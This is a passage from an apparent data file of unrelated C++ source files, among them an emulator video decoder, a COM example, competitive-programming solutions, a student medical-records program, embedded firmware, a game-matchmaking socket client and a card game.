(current_codec != codec) {\n        current_codec = codec;\n        LOG_INFO(Service_NVDRV, \"NVDEC video codec initialized to {}\", GetCurrentCodecName());\n    }\n}\n\nvoid Codec::Decode() {\n    const bool is_first_frame = !initialized;\n    if (is_first_frame) {\n        Initialize();\n    }\n\n    if (!initialized) {\n        return;\n    }\n\n    // Assemble bitstream.\n    bool vp9_hidden_frame = false;\n    size_t configuration_size = 0;\n    const auto packet_data = [&]() {\n        switch (current_codec) {\n        case Tegra::Host1x::NvdecCommon::VideoCodec::H264:\n            return h264_decoder->ComposeFrame(state, &configuration_size, is_first_frame);\n        case Tegra::Host1x::NvdecCommon::VideoCodec::VP8:\n            return vp8_decoder->ComposeFrame(state);\n        case Tegra::Host1x::NvdecCommon::VideoCodec::VP9:\n            vp9_decoder->ComposeFrame(state);\n            vp9_hidden_frame = vp9_decoder->WasFrameHidden();\n            return vp9_decoder->GetFrameBytes();\n        default:\n            ASSERT(false);\n            return std::span<const u8>{};\n        }\n    }();\n\n    // Send assembled bitstream to decoder.\n    if (!decode_api.SendPacket(packet_data, configuration_size)) {\n        return;\n    }\n\n    // Only receive/store visible frames.\n    if (vp9_hidden_frame) {\n        return;\n    }\n\n    // Receive output frames from decoder.\n    decode_api.ReceiveFrames(frames);\n\n    while (frames.size() > 10) {\n        LOG_DEBUG(HW_GPU, \"ReceiveFrames overflow, dropped frame\");\n        frames.pop();\n    }\n}\n\nstd::unique_ptr<FFmpeg::Frame> Codec::GetCurrentFrame() {\n    // Sometimes VIC will request more frames than have been decoded.\n    // in this case, return a blank frame and don't overwrite previous data.\n    if (frames.empty()) {\n        return {};\n    }\n\n    auto frame = std::move(frames.front());\n    frames.pop();\n    return frame;\n}\n\nHost1x::NvdecCommon::VideoCodec Codec::GetCurrentCodec() const {\n    return current_codec;\n}\n\nstd::string_view Codec::GetCurrentCodecName() const {\n    switch (current_codec) {\n    case Host1x::NvdecCommon::VideoCodec::None:\n        return \"None\";\n    case Host1x::NvdecCommon::VideoCodec::H264:\n        return \"H264\";\n    case Host1x::NvdecCommon::VideoCodec::VP8:\n        return \"VP8\";\n    case Host1x::NvdecCommon::VideoCodec::H265:\n        return \"H265\";\n    case Host1x::NvdecCommon::VideoCodec::VP9:\n        return \"VP9\";\n    default:\n        return \"Unknown\";\n    }\n}\n} // namespace Tegra\n",
    "#include <iostream>\r\n#include <objbase.h>\r\n\r\ninterface IX : IUnknown {\r\n    virtual void MethodX() = 0;\r\n};\r\n\r\ninterface IY : IUnknown {\r\n    virtual void MethodY() = 0;\r\n};\r\n\r\ninterface IZ : IUnknown {\r\n    virtual void MethodZ() = 0;\r\n};\r\n\r\nclass CA : public IX, public IY {\r\npublic:\r\n    STDMETHOD(QueryInterface)(REFIID riid, void** ppvObject) {\r\n        if (riid == IID_IUnknown) {\r\n            *ppvObject = static_cast<IUnknown*>(this);\r\n        }\r\n        else if (riid == IID_IX) {\r\n            *ppvObject = static_cast<IX*>(this);\r\n        }\r\n        else if (riid == IID_IY) {\r\n            *ppvObject = static_cast<IY*>(this);\r\n        }\r\n        else {\r\n            *ppvObject = NULL;\r\n            return E_NOINTERFACE;\r\n        }\r\n\r\n        static_cast<IUnknown*>(*ppvObject)->AddRef();\r\n        return S_OK;\r\n    }\r\n\r\n    STDMETHOD_(ULONG, AddRef)() {\r\n        return ++m_RefCount;\r\n    }\r\n\r\n    STDMETHOD_(ULONG, Release)() {\r\n        if (--m_RefCount == 0) {\r\n            delete this;\r\n            return 0;\r\n        }\r\n        return m_RefCount;\r\n    }\r\n\r\n    void MethodX() override {\r\n        std::cout << \"MethodX called.\" << std::endl;\r\n    }\r\n\r\n    void MethodY() override {\r\n        std::cout << \"MethodY called.\" << std::endl;\r\n    }\r\n\r\nprivate:\r\n    ULONG m_RefCount = 1;\r\n};\r\n\r\nIUnknown* CreateInstance() {\r\n    CA* pCA = new CA();\r\n    return static_cast<IUnknown*>(pCA);\r\n}\r\n\r\nint main() {\r\n    CoInitialize(NULL);\r\n\r\n    IUnknown* pIUnknown = CreateInstance();\r\n    if (pIUnknown == nullptr) {\r\n        std::cerr << \"Failed to create instance.\" << std::endl;\r\n        CoUninitialize();\r\n        return 1;\r\n    }\r\n\r\n    IX* pIX = NULL;\r\n    if (SUCCEEDED(pIUnknown->QueryInterface(IID_IX, reinterpret_cast<void**>(&pIX)))) {\r\n        pIX->MethodX();\r\n        pIX->Release();\r\n    }\r\n\r\n    IY* pIY = NULL;\r\n    if (SUCCEEDED(pIUnknown->QueryInterface(IID_IY, reinterpret_cast<void**>(&pIY)))) {\r\n        pIY->MethodY();\r\n        pIY->Release();\r\n    }\r\n\r\n    IZ* pIZ = NULL;\r\n    if (FAILED(pIUnknown->QueryInterface(IID_IZ, reinterpret_cast<void**>(&pIZ)))) {\r\n        std::cout << \"Component does not support IZ interface.\" << std::endl;\r\n    }\r\n\r\n    pIUnknown->Release();\r\n    CoUninitialize();\r\n\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n// \uc624\ub984\ucc28\uc21c \ubd88\ub9cc\uc871 \ud655\uc778 \ud568\uc218\r\nbool cantSupply(int& standard, pair<int, int>& next) {\r\n    return (next.first < standard && next.second < standard);\r\n}\r\n\r\nint main() {\r\n    // \ucd5c\uc801\ud654 \ucf54\ub4dc\r\n    ios_base::sync_with_stdio(false);\r\n    cin.tie(nullptr);\r\n    cout.tie(nullptr);\r\n\r\n    // \ub3c4\uc2dc\uc758 \uc218 \uc785\ub825\r\n    int n;\r\n    cin >> n;\r\n    // \ub3c4\uc2dc \ubcc4 \ucd5c\uc18c, \ucd5c\ub300 \uc694\uad6c\ub7c9 \uc785\ub825\r\n    vector<pair<int, int> > needs;\r\n    for (int i = 0; i < n; i++) {\r\n        int min, max;\r\n        cin >> min >> max;\r\n        needs.push_back({min, max});\r\n    }\r\n    // \ubc30\uc1a1 \ud69f\uc218 \ucd08\uae30\uac12 1\ub85c \ucd08\uae30\ud654\r\n    int ans = 1;\r\n\r\n    // \uad6c\uac04\uc758 \ucd5c\uc18c\uac12\uc744 \uae30\uc900\uac12\uc73c\ub85c \uc124\uc815\r\n    int standard = needs[0].first;\r\n    // \uad6c\uac04\uc758 \uc624\ub984\ucc28\uc21c \ub9cc\uc871 \uc5ec\ubd80 \ud655\uc778\r\n    for (int i = 0; i < n; ++i) {\r\n        // \uad6c\uac04\uc774 \uc624\ub984\ucc28\uc21c\uc744 \ub9cc\uc871\ud558\uc9c0 \uc54a\uc73c\uba74\r\n        if (cantSupply(standard, needs[i])) {\r\n            ans++;\r\n            standard = needs[i].first;\r\n        }\r\n        // \uad6c\uac04\uc774 \uc624\ub984\ucc28\uc21c\uc744 \ub9cc\uc871\ud55c\ub2e4\uba74\r\n        else {\r\n            standard = max(standard, needs[i].first);\r\n        }\r\n    }\r\n    // \ucd9c\ub825\r\n    cout << ans;\r\n\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include <vector>\n#include <algorithm>\n\nusing namespace std;\n\nstruct Cidade\n{\n    int codigo;\n    char nome[35];\n    char UF[2];\n};\n\nstruct Especialidade\n{\n    int codigo;\n    char descricao[50];\n};\n\nstruct Medico\n{\n    int codigo;\n    char nome[35];\n    int codigo_especialidade;\n    char endereco[35];\n    char telefone[13];\n    int codigo_cidade;\n};\n\nstruct Paciente\n{\n    int codigo;\n\n    char CPF[11];\n    char nome[35];\n    char endereco[35];\n    int codigo_cidade;\n};\n\nstruct CID\n{\n    int codigo;\n    char descricao[50];\n};\n\nstruct Medicamento\n{\n    int codigo;\n    char descricao[50];\n    int quant_estoque;\n    int estoque_minimo;\n    int estoque_maximo;\n    float preco_unitario;\n};\n\nstruct Data\n{\n    int dia;\n    int mes;\n    int ano;\n};\nstruct Consulta\n{\n    char cpf_paciente[11];\n    int cod_medico;\n    char horario[5];\n    Data data;\n    int cod_CID;\n    int cod_medicamento;\n    int qtde_medicamento;\n};\n\nvoid lerDadosCidades(Cidade cidade[], int quantidade)\n{\n    for (int i = 0; i < quantidade; i++)\n    {\n        cout << \"Insira o c\u00f3digo da cidade: \";\n        cin >> cidade[i].codigo;\n        cout << \"Insira o nome da cidade: \";\n        cin >> cidade[i].nome;\n        cout << \"Insira a Unidade Federal da cidade (Siglas): \";\n        cin >> cidade[i].UF;\n    }\n}\nvoid lerDadosEspecialidades(Especialidade especialidade[], int quantidade)\n{\n    for (int i = 0; i < quantidade; i++)\n    {\n        cout << \"Insira o c\u00f3digo da especialidade m\u00e9dica: \";\n        cin >> especialidade[i].codigo;\n        cout << \"Insira a descri\u00e7\u00e3o da especialidade: \";\n        cin >> especialidade[i].descricao;\n    }\n}\n\nvoid lerDadosCID(struct CID CID[], int &contador)\n{\n\n    int i = 0;\n    for (int saida = 1; i < 20 && saida != 0; i++)\n    {\n        cout << \"\\n\\nCodigo do CID \" << (i + 1) << \": \";\n        cin >> CID[i].codigo;\n        if (CID[i].codigo > 0)\n        {\n        }\n        else\n            saida = 0;\n    }\n    contador = i - 1;\n\n    // imprimirEstruturaPaciente(CID, contador);\n}\n\n// void imprimirEstruturaPaciente(struct Estrutura Estrutura[], int contador)\n// {\n//     cout << \"\\n\\nLista dos Registros\" << endl;\n//     for (int i = 0; i < contador; i++)\n//     {\n\n//         cout << \"valores: \" << Estrutura[i].codigo << endl;\n//     }\n//         cout << \"qnt: \" << contador << endl;\n// }\n\nvoid imprimirEstruturaPaciente(struct Paciente Paciente[], int contador)\n{\n    cout << \"\\n\\nLista dos Registros\" << endl;\n    for (int i = 0; i < contador; i++)\n    {\n\n        cout << \"valores: \" << Paciente[i].codigo << endl;\n    }\n    cout << \"qnt: \" << contador << endl;\n}\n\nvoid imprimirEstruturaMedico(struct Medico Medico[], int contador)\n{\n    cout << \"\\n\\nLista dos Registros\" << endl;\n    for (int i = 0; i < contador; i++)\n    {\n\n        cout << \"valores: \" << Medico[i].codigo << endl;\n    }\n    cout << \"qnt: \" << contador << endl;\n}\n\nvoid lerDadosMedicamentos(struct Medicamento Medicamento[], int &contador)\n{\n\n    int i = 0;\n    for (int saida = 1; i < 20 && saida != 0; i++)\n    {\n        cout << \"\\n\\nCodigo do Medicamento \" << (i + 1) << \": \";\n        cin >> Medicamento[i].codigo;\n        if (Medicamento[i].codigo > 0)\n        {\n        }\n        else\n            saida = 0;\n    }\n    contador = i - 1;\n\n    // imprimirMedicamento(Medicamento, contador);\n}\n\nvoid verificarSeCPFRepetiuNosArrays(struct Paciente S[], int contadorS, struct Paciente T[], int contadorT)\n{\n    for (int i = 0; i < contadorS; i++)\n    {\n        for (int j = 0; j < contadorT; j++)\n        {\n            if (S[i].CPF == T[j].CPF)\n            {\n                cout << \"CPF repetido: \" << S[i].CPF << endl;\n            }\n        }\n    }\n}\n\nbool codigoJaAdicionado(int codigo, Medico A[], int contadorA)\n{\n    for (int i = 0; i < contadorA; i++)\n    {\n        if (A[i].codigo == codigo)\n        {\n            return true;\n        }\n    }\n    return false;\n}\n\nbool verificarSeCPFPacienteRepetiu(struct Paciente Paciente[], string cpf, int index)\n{\n\n    for (int i = 0; i < index; i++)\n    {\n        if (cpf == Paciente[i].CPF)\n        {\n            cout << \"\\n\\n Paciente Encontrado\";\n            return true;\n        }\n    }\n\n    return false;\n}\n\nvoid lerDadosPacientes(struct Paciente Paciente[], int &contador)\n{\n\n    int i = 0;\n    for (int saida = 1; i < 20 && saida != 0; i++)\n    {\n        cout << \"\\n\\nCodigo do Paciente \" << (i + 1) << \": \";\n        cin >> Paciente[i].codigo;\n        if (Paciente[i].codigo > 0)\n        {\n            cout << \"\\n\\n CPF do Paciente \" << (i + 1) << \": \";\n            cin >> Paciente[i].CPF;\n            if (!verificarSeCPFPacienteRepetiu(Paciente, Paciente[i].CPF, i))\n            {\n                cout << \"CPF n repetiu: \";\n            }\n            else\n            {\n                i--;\n            }\n        }\n        else\n            saida = 0;\n    }\n    contador = i - 1;\n}\n\nbool verificarSeCodigoMedicoRepetiu(struct Medico Medico[], int cod, int index)\n{\n\n    for (int i = 0; i < index; i++)\n    {\n        if (cod == Medico[i].",
    "#include <cmath>\n#include <iostream>\n#include <vector>\n\nvoid UpdatePoint(long long index, long long delta,\n                 std::vector<long long>& segment_tree) {\n  do {\n    segment_tree[index] += delta;\n    index = (index - 1) / 2;\n  } while (index != 0);\n  segment_tree[0] += delta;\n}\n\nlong long GetSum(long long index, std::pair<long long, long long> cur_bounds,\n                 std::pair<long long, long long> bounds,\n                 std::vector<long long>& segment_tree) {\n  long long left = bounds.first;\n  long long right = bounds.second;\n  long long cur_left = cur_bounds.first;\n  long long cur_right = cur_bounds.second;\n  if (cur_left == left && cur_right == right) {\n    return segment_tree[index];\n  }\n  long long answer = 0;\n  long long middle = (cur_left + cur_right) / 2;\n  if (left <= middle) {\n    answer += GetSum(2 * index + 1, {cur_left, middle},\n                     {left, std::min(right, middle)}, segment_tree);\n  }\n  if (right > middle) {\n    answer += GetSum(2 * index + 2, {middle + 1, cur_right},\n                     {std::max(left, middle + 1), right}, segment_tree);\n  }\n  return answer;\n}\n\nint main() {\n  long long cnt;\n  std::cin >> cnt;\n\n  long long fake_cnt = pow(2, ceil(log(cnt) / log(2)));\n\n  std::vector<long long> segment_tree(fake_cnt * 2 - 1, 0);\n  for (long long i = fake_cnt - 1; i < fake_cnt - 1 + cnt; i++) {\n    std::cin >> segment_tree[i];\n    if (i % 2 != 0) {\n      segment_tree[i] *= -1;\n    }\n  }\n\n  for (long long i = fake_cnt - 2; i >= 0; i--) {\n    segment_tree[i] = segment_tree[2 * i + 1] + segment_tree[2 * i + 2];\n  }\n\n  long long qst;\n  std::cin >> qst;\n\n  for (long long i = 0; i < qst; i++) {\n    long long command;\n    std::cin >> command;\n\n    if (command == 0) {\n      // update in point\n      long long index;\n      long long delta;\n      std::cin >> index >> delta;\n\n      long long mult = 1;\n      if (index % 2 == 1) {\n        mult = -1;\n      }\n\n      index += fake_cnt - 2;\n      delta = mult * delta - segment_tree[index];\n\n      UpdatePoint(index, delta, segment_tree);\n    } else {\n      // getSum\n      long long left;\n      long long right;\n      std::cin >> left >> right;\n\n      long long result =\n          GetSum(0, {0, fake_cnt - 1}, {left - 1, right - 1}, segment_tree);\n      if (left % 2 == 1) {\n        result *= -1;\n      }\n      std::cout << result << \"\\n\";\n    }\n  }\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_3\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"firmware.h\"\n\n#ifdef __AVR__\n#include <avr/interrupt.h>\n#include <avr/power.h>\n#include <avr/wdt.h>\n#include <avr/sleep.h>\n#endif\n\n#define BTN PIN_PC1\n#define MOSFET PIN_PC2\n\nusing namespace neoheart;\nvoid enableSleep();\nvoid softwareReset();\nvoid runRandomAnim();\nvoid disableSleep();\n\nvoid setup() {\n    // init leds\n    initLeds();\n    // clear strip from previous animations\n    clearStrip();\n    // init io\n    pinMode(BTN, INPUT_PULLUP);\n    pinMode(MOSFET, OUTPUT);\n    // init random seed\n    randomSeed(analogRead(PIN_PA2));\n    // attach to interrupt\n    attachInterrupt(digitalPinToInterrupt(BTN), softwareReset, FALLING);\n    runRandomAnim();\n}\n\nvoid loop() {\n    // nothing to do here\n}\n\nvoid runRandomAnim(){\n    digitalWrite(MOSFET, LOW);\n    void (*animations[])() = {heartbeat, bottomup, theatherFill, bounce, incrementalFill, chase, colorWipe, rainbow, theaterChaseRainbow};\n    int randomIndex = random(sizeof(animations) / sizeof(animations[0]));\n    animations[randomIndex]();\n    digitalWrite(MOSFET, HIGH);\n    detachInterrupt(digitalPinToInterrupt(BTN));\n    attachInterrupt(digitalPinToInterrupt(BTN), disableSleep, CHANGE);\n    enableSleep();\n}\n\nvoid softwareReset() {\n    // clear interrupts\n    cli();\n    // write in the watchdog control register\n    _PROTECTED_WRITE(WDT.CTRLA, WDT_PERIOD_8CLK_gc | WDT_WINDOW_OFF_gc);\n    // wait for the watchdog to reset the device\n    while (1);\n}\n\nvoid enableSleep() {\n    sleep_enable();\n    set_sleep_mode(SLEEP_MODE_PWR_DOWN);  \n    sleep_cpu();\n}\n\nvoid disableSleep() {\n    sleep_disable();\n    softwareReset();\n}\n",
    "// \uc2e4\uc2b51 \ub85c\ub610 \ubc88\ud638 \ucd94\ucca8 \ud504\ub85c\uadf8\ub7a8\n\n#include <iostream>\n#include <ctime>\n#include <cstdlib>\nusing namespace std;\n\n\nvoid Swap(int& a, int& b);\nvoid Sort(int* numbers, int count);\nvoid ChooseLotto(int* numbers);\n\n\n\nint main()\n{\n\tsrand(time(NULL));\n\tint lotto[6];\n\n\tChooseLotto(lotto);\n\n\tSort(lotto, 6);\n\n\tfor (int i = 0; i < 6; i++)\n\t{\n\t\tcout << lotto[i] << \" \";\n\t}\n\n\treturn 0;\n}\n\nvoid Swap(int& a, int& b)\n{\n\tint temp = b;\n\tb = a;\n\ta = temp;\n}\n\nvoid Sort(int* numbers, int count) // numbers\ub294 \ubc88\ud638 \ubc30\uc5f4, count\ub294 \ub85c\ub610\ubc88\ud638 6\uac1c\n{\n\tfor (int i = 0; i < count - 1; i++) \n\t{\n\t\tfor (int j = 0; j < count - 1; j++) \n\t\t{\n\t\t\tif (numbers[j] > numbers[j + 1])\n\t\t\t{\n\t\t\t\tSwap(numbers[j], numbers[j + 1]); \n\t\t\t\t\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid ChooseLotto(int* numbers)\n{\n\n\tint count = 0;\n\twhile (count != 6)\n\t{\n\t\tint number = rand() % 45 + 1; // 0 ~ 44\uae4c\uc9c0 \ub098\uc634\n\t\tbool found = false; // \uc911\ubcf5\n\n\t\t//\uc911\ubcf5 \uac80\uc0ac\uae30\n\t\tfor (int i = 0; i < count; i++)\n\t\t{\n\t\t\tif (numbers[i] == number)\n\t\t\t{\n\t\t\t\tfound = true;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif (found == false) // \uc911\ubcf5\ub41c \uac12 \uc5c6\uc73c\uba74 count \uc62c\ub77c\uac10\n\t\t{\n\t\t\tnumbers[count] = number;\n\t\t\tcount++;\n\t\t}\n\n\t}\n\n\n}",
    "#include \"signaling.h\"\n\nvoid to_json(Json& out_json, const SignalPacket& packet) {\n\ttry {\n\t\tout_json = {\n\t\t\t{\"peer_id\", packet.peer_address.b64()},\n\t\t\t{\"message_type\", packet.message_type},\n\t\t\t{\"data\", packet.data},\n\t\t};\n\t} catch (const Json::exception& e) {\n\t\tspdlog::dump_backtrace();\n\t\tspdlog::error(\"Signal packet to_json error : {}\", e.what());\n\t}\n};\n\nvoid from_json(const Json& json, SignalPacket& out_packet) {\n\ttry {\n\t\tauto tempstr = json.at(\"peer_id\").get<std::string>();\n\t\tout_packet.peer_address = base64::from_base64(tempstr);\n\t\tjson.at(\"message_type\").get_to(out_packet.message_type);\n\t\tjson.at(\"data\").get_to(out_packet.data);\n\t} catch (const Json::exception& ex) {\n\t\tspdlog::dump_backtrace();\n\t\tspdlog::error(\"Signal packet from_json error: {}. JSON dump: {}\", ex.what(), json.dump());\n\t}\n};\n\nbool SignalingSocket::try_init() {\n\tspdlog::info(\"Connecting to matchmaking server\");\n\tm_current_state = SocketState::Connecting;\n\n\taddrinfo hints = {}; \n\taddrinfo* result = nullptr;\n\thints.ai_family = AF_INET;\n\thints.ai_socktype = SOCK_STREAM;\n\thints.ai_flags = AI_PASSIVE;\n\n\tconst auto& snp_config = SnpConfig::instance();\n\tif (const auto error = getaddrinfo(snp_config.server.c_str(), std::to_string(snp_config.port).c_str(), &hints, &result)) {\n\t\tspdlog::dump_backtrace();\n\t\tspdlog::error(\"getaddrinfo failed with error {}: {}\", error, gai_strerror(error));\n\t\treturn false;\n\t}\n\n\tfor (auto info = result; info; info = info->ai_next) {\n\t\tif ((m_socket = socket(info->ai_family, info->ai_socktype, info->ai_protocol)) == -1) {\n\t\t\tspdlog::debug(\"Client: Socket failed with error: {}\", std::strerror(errno));\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (connect(m_socket, info->ai_addr, info->ai_addrlen) == -1) {\n\t\t\tclosesocket(m_socket);\n\t\t\tspdlog::dump_backtrace();\n\t\t\tspdlog::error(\"Client: Couldn't connect to server: {}\", std::strerror(errno));\n\t\t\tcontinue;\n\t\t}\n\n\t\tbreak;\n\t}\n\tif (!result) {\n\t\tspdlog::dump_backtrace();\n\t\tspdlog::error(\"Signaling client failed to connect\");\n\t\treturn false;\n\t}\n\n\tfreeaddrinfo(result);\n\n\t// Server address: each byte is 11111111\n\tmemset(&m_server, 255, sizeof(NetAddress));\n\n\tspdlog::info(\"Successfully connected to matchmaking server\");\n\tm_current_state = SocketState::Ready;\n\treturn true;\n}\n\nvoid SignalingSocket::deinit() {\n\tif (m_socket) {\n\t\tclosesocket(m_socket);\n\t\tm_socket = 0;\n\t}\n}\n\nvoid SignalingSocket::send_packet(NetAddress dest, SignalMessageType msg_type, const std::string& msg) {\n\tsend_packet(SignalPacket{dest, msg_type, msg});\n}\n\nvoid SignalingSocket::send_packet(const SignalPacket& packet) {\n\tif (m_current_state != SocketState::Ready) {\n\t\tspdlog::dump_backtrace();\n\t\tspdlog::error(\"Signal send_packet attempted but provider is not ready. State: {}\", as_string(m_current_state));\n\t\treturn;\n\t}\n\n\tstd::lock_guard lock{m_mutex};\n\tJson json = packet;\n\tauto send_buffer = json.dump();\n\tsend_buffer += Delimiter;\n\tspdlog::debug(\"Sending to server, buffer size: {}, contents: {}\", send_buffer.size(), send_buffer);\n\n\tint bytes = send(m_socket, send_buffer.c_str(), send_buffer.size(), 0);\n\tif (bytes == -1) {\n\t\tspdlog::dump_backtrace();\n\t\tspdlog::error(\"Signaling send packet error: {}\", std::strerror(errno));\n\t}\n}\n\nvoid SignalingSocket::split_into_packets(const std::string& data, std::vector<SignalPacket>& incoming_packets) {\n\tsize_t pos_start = 0;\n\tsize_t pos_end = 0;\n\tsize_t delim_len = Delimiter.length();\n\n\tincoming_packets.clear();\n\twhile ((pos_end = data.find(Delimiter, pos_start)) != std::string::npos) {\n\t\tconst auto segment = data.substr(pos_start, pos_end - pos_start);\n\t\tpos_start = pos_end + delim_len;\n\t\ttry {\n\t\t\tJson json = Json::parse(segment);\n\t\t\tincoming_packets.push_back(json.template get<SignalPacket>());\n\t\t}\n\t\tcatch (std::exception& e) {\n\t\t\tspdlog::dump_backtrace();\n\t\t\tspdlog::error(\"could not parse JSON \\\"{}\\\", exc: {}\", segment, e.what());\n\t\t};\n\t}\n}\n\ns32 SignalingSocket::receive_packets(std::vector<SignalPacket>& incoming_packets) {\n\tstatic constexpr unsigned int MAX_BUF_LENGTH = 4096;\n\tstd::vector<char> buffer(MAX_BUF_LENGTH);\n\tstd::string receive_buffer;\n\tauto bytes = recv(m_socket, &buffer[0], buffer.size(), 0);\n\tif (bytes > 0) {\n\t\tspdlog::trace(\"Received {}\", bytes);\n\t\tbuffer.resize(bytes);\n\t\treceive_buffer.append(buffer.begin(), buffer.end());\n\t\tsplit_into_packets(receive_buffer, incoming_packets);\n\t}\n\treturn bytes;\n}\n\nvoid SignalingSocket::start_advertising(){\n\tsend_packet(m_server, SignalMessageType::StartAdvertising);\n}\n\nvoid SignalingSocket::stop_advertising(){\n\tsend_packet(m_server, SignalMessageType::StopAdvertising);\n}\n\nvoid SignalingSocket::request_advertisers(){\n\tsend_packet(m_server, SignalMessageType::RequestAdvertisers);\n}\n\nvoid SignalingSocket::echo(const std::string& data) {\n\tsend_packet(m_server, SignalMessageType::ServerEcho, data);\n}\n\nvoid SignalingSocket::set_client_id(const std::string& id) {\n\tsend_packet(m_server, SignalMessageType::ServerSetID, id);\n}\n\nSocketState SignalingSocket::state() {\n\treturn m_current_state;\n}\n",
    "\n#include <SD_MMC.h>\n#include <WiFi.h>\n#include <Adafruit_BME280.h>    // DO *NOT* mix with #include \"esp_camera.h\" - sensor_t clash\n\n#include \"variables.h\"\n\nextern Adafruit_BME280 bme;\nextern int tickerCamCounter;\nextern size_t photoFrameLength;\nextern bool SDCardOK;\n\nString getMetricsText( void ) {\n\n  String webText;\n\n  webText = \"# TYPE esp_cam_info counter\\n\";\n  webText += \"esp_cam_info \" + String( tickerCamCounter ) + \"\\n\";\n  webText += \"# TYPE esp_cam_info_id gauge\\n\";\n  webText += \"esp_cam_info_id \" + String( CAM_SERIAL ) + \"\\n\";\n  webText += \"# TYPE esp_cam_info_photo_len gauge\\n\";\n  webText += \"esp_cam_info_photo_len \" + String( photoFrameLength ) + \"\\n\";\n  webText += \"# TYPE esp_cam_info_rssi gauge\\n\";\n  webText += \"esp_cam_info_rssi \" + String( WiFi.RSSI() ) + \"\\n\";\n\n#ifdef HAVE_SDCARD\n  if ( SDCardOK ) {\n    webText += \"# TYPE esp_cam_info_sdcard_used gauge\\n\";\n    webText += \"esp_cam_info_sdcard_used \" + String( SD_MMC.usedBytes() ) + \"\\n\";\n  }\n#endif\n\n#ifdef HAVE_BME280\n  if ( bme280Found ) {\n    webText += \"# TYPE esp_cam_info_temperature_C gauge\\n\";\n    webText += \"esp_cam_info_temperature_C \" + String( bme.readTemperature() ) + \"\\n\";\n    webText += \"# TYPE esp_cam_info_humidity gauge\\n\";\n    webText += \"esp_cam_info_humidity \" + String( bme.readHumidity() ) + \"\\n\";\n    webText += \"# TYPE esp_cam_info_pressure gauge\\n\";\n    webText += \"esp_cam_info_pressure \" + String( bme.readPressure() ) + \"\\n\";\n  }\n#endif\n\n  return webText;\n\n}\n",
    "#include <iostream>\n#include <cstring>\n#include <utility>\n#include <vector>\n#include <random>\n#include <algorithm>\n#include <cctype>\n#include <cstdlib>\n#include <direct.h>\n#include <functional>\n#include <unordered_map>\n\n#include <SFML/Graphics.hpp>\n#include <SFML/Window.hpp>\n#include <SFML/System.hpp>\n#include <SFML/Audio.hpp>\n\nusing namespace std;\nusing namespace sf;\n\n/// Update and Render class\n\nclass UpdateAndRender { /// clasa de baza pentru update si render\n\npublic:\n    virtual void update() = 0;\n    virtual void render() = 0;\n};\n\n\n\n\n/// enum a fost folosit pentru a face codul mai usor de citit si de inteles iar functiile de conversie sunt folosite pentru a afisa mai usor informatiile\n\nenum Suit {\n    HEARTS = 1, DIAMONDS, CLUBS, SPADES /// vor fi indexate de la 1 la 4\n};\n\nenum Rank {\n    ACE = 1, TWO, THREE, FOUR, FIVE, SIX, SEVEN, EIGHT, NINE, TEN, JACK, QUEEN, KING /// vor fi indexate de la 1 la 13\n};\n\nenum ChipType {\n    WHITE = 1, RED, BLUE, GREEN, BLACK, PURPLE, YELLOW /// 1, 5, 10, 25, 100, 500, 1000 - de tinut minte\n};\n\nint value(ChipType chipValue) /// functie care returneaza valoarea unui chip\n{\n    switch (chipValue) {\n    case WHITE:\n        return 1;\n    case RED:\n        return 5;\n    case BLUE:\n        return 10;\n    case GREEN:\n        return 25;\n    case BLACK:\n        return 100;\n    case PURPLE:\n        return 500;\n    case YELLOW:\n        return 1000;\n    default:\n        throw runtime_error(\"Invalid chip value\");\n    }\n}\n\n\nstring suitToString(Suit suit) {\n    switch (suit) {\n    case HEARTS:\n        return \"HEARTS\";\n    case DIAMONDS:\n        return \"DIAMONDS\";\n    case CLUBS:\n        return \"CLUBS\";\n    case SPADES:\n        return \"SPADES\";\n    default:\n        throw runtime_error(\"Invalid suit\");\n    }\n}\n\nstring rankToString(Rank rank) {\n    switch (rank) {\n    case ACE:\n        return \"ACE\";\n    case TWO:\n        return \"TWO\";\n    case THREE:\n        return \"THREE\";\n    case FOUR:\n        return \"FOUR\";\n    case FIVE:\n        return \"FIVE\";\n    case SIX:\n        return \"SIX\";\n    case SEVEN:\n        return \"SEVEN\";\n    case EIGHT:\n        return \"EIGHT\";\n    case NINE:\n        return \"NINE\";\n    case TEN:\n        return \"TEN\";\n    case JACK:\n        return \"JACK\";\n    case QUEEN:\n        return \"QUEEN\";\n    case KING:\n        return \"KING\";\n    default:\n        throw runtime_error(\"Invalid rank\");\n    }\n}\n\nstring chipValueToString(ChipType chipValue) {\n    switch (chipValue) {\n    case WHITE:\n        return \"WHITE\";\n    case RED:\n        return \"RED\";\n    case BLUE:\n        return \"BLUE\";\n    case GREEN:\n        return \"GREEN\";\n    case BLACK:\n        return \"BLACK\";\n    case PURPLE:\n        return \"PURPLE\";\n    case YELLOW:\n        return \"YELLOW\";\n    default:\n        throw runtime_error(\"Invalid chip value\");\n    }\n}\n\nSuit stringToSuit(const string& suit) {\n    if (suit == \"HEARTS\")\n        return HEARTS;\n    if (suit == \"DIAMONDS\")\n        return DIAMONDS;\n    if 